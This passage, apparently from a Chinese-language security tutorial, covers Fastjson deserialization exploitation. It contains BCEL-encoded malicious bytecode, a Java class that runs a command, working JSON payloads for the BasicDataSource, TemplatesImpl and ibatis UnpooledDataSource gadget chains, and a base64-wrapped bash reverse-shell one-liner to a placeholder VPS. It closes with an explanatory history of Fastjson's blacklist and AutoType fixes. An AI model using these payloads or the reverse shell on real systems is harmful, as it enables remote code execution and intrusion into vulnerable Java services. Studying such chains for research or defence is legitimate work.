//$$BECL$$$l$8b$I$A$A$A$A$A$A$AeP$bbN$CA$U$3d$D$cb$O$ac$8b$bc$c47$sV$82$854v$Q$h$a3$W$e2$pb$b4$k$c6$J$Z$5cv$c92$Y$fe$c8$9aF$8d$85$l$e0G$Z$efl$M$908$c5$7d$9c$c7$bd7$f3$fd$f3$f9$F$e0$Y$7b$k8J$k$ca$a8d$b1fs$95c$9dc$83c$93$c1m$ebP$9b$T$86t$bd$f1$c0$e0$9cFO$8a$a1$d0$d1$a1$ba$9e$M$7b$w$be$X$bd$80$90l$5b$G$7f$ca$7c$d7$I$f9$7c$rF$JE$b3$Y$bcn4$89$a5$3a$d7$89TMGG$D$f1$o$7cd$91$e3$d8$f2$b1$8d$j$9a$zE$m$7d$ec$a2$c6P$b1$7c3$Qa$bfy6$95jdt$U$d2$N$e4d$u$$$b8$9b$de$40I$c3PZ$40w$93$d0$e8$n$ad$f1$fa$ca$cc$9bj$bd$d1$f9$a7i$d1N5U$92$e1$a0$be$c4vM$ac$c3$7ek$d9p$hGR$8d$c7$z$ec$c3$a5$df$b2$_$Ff$cf$a7$e8QW$a3$cc$ug$O$df$c1fT0$acPt$T$d0$K$fd$b9$f4$o$b1$C$ab$lH$95$d3op$k_$e1$5c$ce$S$yG$ba$M$f1$d6$5b$86C$d1$n$ccM$d0$3c$z$ce$T$c2$91$eap$ac$da$b1$85$e4$8e$e2$_$M$c2$l$G$cb$B$A$A
```

`exp.classs` => java1.8_65

```java
public class exp{
    static {
        try{
            Runtime.getRuntime().exec("calc");
        } catch (Exception e) {
        }
    }
}
```

构造`poc`如下，成功弹出计算器

```json
{
    "a": {
        "@type": "java.lang.Class",
        "val": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"
    },
    "b": {
        "@type": "java.lang.Class",
        "val": "com.sun.org.apache.bcel.internal.util.ClassLoader"
    },
    "c": {
        "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
        "driverClassLoader": {
            "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
        },
        "driverClassName": "$$BECL$$$l$8b$I$A$A$A$A$A$A$AeP$bbN$CA$U$3d$D$cb$O$ac$8b$bc$c47$sV$82$854v$Q$h$a3$W$e2$pb$b4$k$c6$J$Z$5cv$c92$Y$fe$c8$9aF$8d$85$l$e0G$Z$efl$M$908$c5$7d$9c$c7$bd7$f3$fd$f3$f9$F$e0$Y$7b$k8J$k$ca$a8d$b1fs$95c$9dc$83c$93$c1m$ebP$9b$T$86t$bd$f1$c0$e0$9cFO$8a$a1$d0$d1$a1$ba$9e$M$7b$w$be$X$bd$80$90l$5b$G$7f$ca$7c$d7$I$f9$7c$rF$JE$b3$Y$bcn4$89$a5$3a$d7$89TMGG$D$f1$o$7cd$91$e3$d8$f2$b1$8d$j$9a$zE$m$7d$ec$a2$c6P$b1$7c3$Qa$bfy6$95jdt$U$d2$N$e4d$u$$$b8$9b$de$40I$c3PZ$40w$93$d0$e8$n$ad$f1$fa$ca$cc$9bj$bd$d1$f9$a7i$d1N5U$92$e1$a0$be$c4vM$ac$c3$7ek$d9p$hGR$8d$c7$z$ec$c3$a5$df$b2$_$Ff$cf$a7$e8QW$a3$cc$ug$O$df$c1fT0$acPt$T$d0$K$fd$b9$f4$o$b1$C$ab$lH$95$d3op$k_$e1$5c$ce$S$yG$ba$M$f1$d6$5b$86C$d1$n$ccM$d0$3c$z$ce$T$c2$91$eap$ac$da$b1$85$e4$8e$e2$_$M$c2$l$G$cb$B$A$A"
    }
}
```

再去构造编写反弹shell构造即可

```bash
bash -c {echo,bash -i >& /dev/tcp/VPS/6666 0>&1的base64}|{base64,-d}|{bash,-i}
```

#### 基于Spring echo回显

```json
{
    "a": {
        "@type": "java.lang.Class",
        "val": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"
    },
    "b": {
        "@type": "java.lang.Class",
        "val": "com.sun.org.apache.bcel.internal.util.ClassLoader"
    },
    "c": {
        "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
        "driverClassLoader": {
            "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
        },
        "driverClassName": "字节码放入此处"
    }
}
```

前面讲过就是Fastjson的版本在`1.2.22-1.2.24`主要有两条链利用TemplatsImpl和JdbcRowSetImpl

#### 基于`TemplatesImpl class`

```json
{
    "a": {
        "@type": "java.lang.Class",
        "val": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"
        },
    "b": {
        "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
        "_bytecodes": ["字节码"],
        '_name': 'a.b',
        '_tfactory': {},
        "_outputProperties": {},
        "_name": "b",
        "_version": "1.0",
        "allowedProtocols": "all"
      }
}
```

#### 基于ibatis组件

```xml
pom.xml
<dependency>
    <groupId>org.mybatis</groupId>
  <artifactId>mybatis</artifactId>
  <version>3.5.2</version>
</dependency>
```

姿势：`延时Payload`

```json
{"@type":"com.alibaba.fastjson.JSONObject","name":{"@type":"java.lang.Class","val":"org.apache.ibatis.datasource.unpooled.UnpooledDataSource"},"c":{"@type":"org.apache.ibatis.datasource.unpooled.UnpooledDataSource","key":{"@type":"java.lang.Class","val":"com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassLoader":{"@type":"com.sun.org.apache.bcel.internal.util.ClassLoader"},"driver":"{$$BCEL$$$l$8b$I$A$A$A$A$A$A$AU$90$b9N$c3$40$Q$86$ff$J$b678$O$Jq8$r$K$ba$84$824$94$R$N$87$c4$8d$94$u$fdz$b3$C$H$c7$b6$8c$83x$E$de$84$3a$V$88$82$H$e0$a1$Q$b3$L$C1$c5$cc$ee7$ff$i$bb$l$9fo$ef$A$f6$b0$e9C$60$d9$85$b5$f0$c9G$L$a1$40$5b$60E$60$95$e0$f5$e34$$$f7$J$L$9d$ee$88$e0$idcMh$9c$c7$a9$be$9cM$p$5d$Me$940$a9$f6U$f2$a3$ac$PJ$a9$ee$$dnS$dc$8b$e0$P$b2Y$a1$f4ql$a5$d7$99$da$9d$c8$H$Z$a0$8aE$81$b5$A$eb$d8$m$84$86$f5$S$99$de$f4$8e$k$95$ce$cb8Ky$$$ab$J$cd$bf$dcU4$d1$aa$fc$87$86$b7$85$96c$82$7b$9fh$9d$f3$96$9d$d3$ee$I$db$f0$f8i$c6$w$m3$8a$bd$cf$b7$z$8e$c4$d1$ddy$B$cd$f9$40$a8$b1$f7$y4$c2$e0WzhK$81Z$h$95W8$cfp$ce$e6$Wx$yq9i$K$5bp$d8$3b$cc$be$a9$f9$d0$3a$T$81$ca$89$c0$92$e9$d9$b0K4$bf$A5$8d$cc6u$B$A$A}"}}
回显Payload
{"@type":"com.alibaba.fastjson.JSONObject","name":{"@type":"java.lang.Class","val":"org.apache.ibatis.datasource.unpooled.UnpooledDataSource"},"c":{"@type":"org.apache.ibatis.datasource.unpooled.UnpooledDataSource","key":{"@type":"java.lang.Class","val":"com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassLoader":{"@type":"com.sun.org.apache.bcel.internal.util.ClassLoader"},"driver":"{字节码放这里}"}}
```

### 总结拓展

到这里，基本`Fastjson系列`漏洞利用链子调试完成。下面总结知识点，拓展

**`反序列化核心`**

反序列化是通过字符串或字节流，利用Java的反射机制重构一个对象。主要有两种机制：

1. Java Bean反序列化机制

   ：通过反射机制实例化一个类，然后直接设置字段的值。

   - 典型实现：JDK原生、Hessian等。

2. Property反序列化机制

   ：通过反射机制实例化一个类，通过调用setter方法设置字段的值。

   - 典型实现：Fastjson、Jackson等。

**`Fastjson中的Property-based反序列化漏洞`**

- 在AutoType过程中，Fastjson会调用setter/getter方法：
  - `parse()`：通过构造器方法实例化类，并调用setter方法。
  - `parseObject()`：是`parse`方法的封装，除调用setter外，还会调用getter方法（因为会调用`toJSON`）。

### Fastjson漏洞的对抗史

1. **1.2.24版本**

   - 没有任何过滤器，可以使用任何类进行反序列化攻击。
   - 典型攻击类：`TemplatesImpl`、`JdbcRowSetImpl`。

2. **1.2.25版本**

   - 引入`checkAutoType`机制，加入黑名单和白名单。
   - AutoType机制开启
     - 先检查白名单，白名单中的类直接加载。
     - 若不在白名单，继续检查黑名单，若不在黑名单，正常加载。
   - AutoType机制关闭
     - 先检查黑名单，若类在黑名单中则抛出异常。
     - 再检查白名单，若不在白名单则抛出异常。

3. **1.2.42版本**

   - 加入对`L;`的检测，发现`L;`则去除。
   - 黑名单和白名单类名隐去，使用hash比对。

4. **1.2.43版本**

   - 加入对`LL;;`的检测，发现`LL;;`则去除。
   - 通过引入对`[`字符的检测进行进一步防护。

5. **1.2.45版本**

   - 黑名单机制问题：黑名单无法穷尽所有恶意类。

6. **1.2.47版本**

   - 开启AutoType且版本在33到47之间
     - 若类不在白名单，则继续检查黑名单。
     - 若类不在黑名单且不在mappings中，则正常加载。
     - 关键问题在于如何往mappings中添加恶意类。
   - **未开启AutoType且版本在24到32之间**，也存在漏洞。

7. **1.2.68版本**

   - 引入`expectedClass`机制，增加了防护，但仍存在逻辑漏洞：
     - 特别是针对`Throwable`类的防护不足。

8. 1.2.80版本

   **异常类漏洞防护**

   - 针对`Throwable`类及其子类的漏洞防护不足进行了增强，防止利用这些类进行攻击。